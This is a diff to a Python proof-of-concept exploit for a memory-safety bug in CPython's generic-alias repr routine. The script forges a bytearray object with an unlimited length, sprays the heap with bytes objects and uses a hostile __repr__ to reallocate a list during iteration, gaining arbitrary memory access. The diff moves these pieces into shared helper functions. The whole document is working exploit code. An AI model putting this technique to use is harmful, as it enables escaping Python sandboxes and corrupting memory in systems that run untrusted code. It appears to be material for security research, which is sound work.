@@ -47,15 +47,12 @@ ga_repr_items_list(_PyUnicodeWriter *writer, PyObject *p)
 # object after the list in memory that will contain a pointer to our fake object with a custom __repr__ we can use to extract
 # the evil object (holy run-on sentence)
 
-p64 = lambda num: num.to_bytes(8, 'little')
-fake_ba = (
-    p64(0x12345) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) +
-    p64(0)
-)
+from common import check_pyversion, evil_bytearray_obj, addrof_bytes, p_long, PTR_SIZE
+
+check_pyversion(introduced_ver=(3, 12, 0))
+
+# see ./common/common.py for evil bytearray obj explanation
+fake_ba, ba_addr = evil_bytearray_obj()
 
 class catch:
     __slots__ = ("mem",)
@@ -65,11 +62,10 @@ class catch:
         return "yes"
 
 fake_obj = (
-    p64(0x54321) +
-    p64(id(catch)) +
-    p64(id(fake_ba) + bytes.__basicsize__ - 1)
+    p_long(0x54321) +
+    p_long(id(catch)) +
+    p_long(ba_addr)
 )
-fake_obj_addr = id(fake_obj) + bytes.__basicsize__ - 1
 
 class evil:
     def __repr__(self):
@@ -80,14 +76,14 @@ class evil:
         # this bytes object will be placed after our new reallocated list in memory.
         # due to the way we set up `evil_lst`, the next value that will have its repr taken
         # will be our fake object which will call catch.__repr__ where we extract our fake_ba object
-        spray.append(p64(fake_obj_addr).ljust(LIST_SIZE * 8 - bytes.__basicsize__, b"A"))
+        spray.append(p_long(addrof_bytes(fake_obj)).ljust(LIST_SIZE * PTR_SIZE - bytes.__basicsize__, b"A"))
         return "did we win?"
 
 # can be any small value realistically, 10 isn't some special magic value
 LIST_SIZE = 10
 
 # here we do (LIST_SIZE + 3) because the bytes header is 0x20 bytes, so we need
-# to append 4 extra items (each item is a ptr, so 8 * 4) so that the ga repr func
+# to append 4 extra items (each item is a ptr, so PTR_SIZE * 4) so that the ga repr func
 # will take the repr of data in the actual bytes, not something in the header.
 # so we add an extra 3 unused values + our evil() obj to fill in those 4 extra items 
 evil_lst = [0] * (LIST_SIZE + 3) + [evil(), "no"]
@@ -96,7 +92,7 @@ prealloc_list_spray_data = [1] * LIST_SIZE
 
 # spray to set up memory in the following format:
 # list data + bytes obj + list data + bytes obj + ... + bytes obj
-spray = [[*prealloc_list_spray_data] if i%2 else bytes(LIST_SIZE * 8 - bytes.__basicsize__)
+spray = [[*prealloc_list_spray_data] if i%2 else bytes(LIST_SIZE * PTR_SIZE - bytes.__basicsize__)
          for i in range(100)]
 
 mem = None
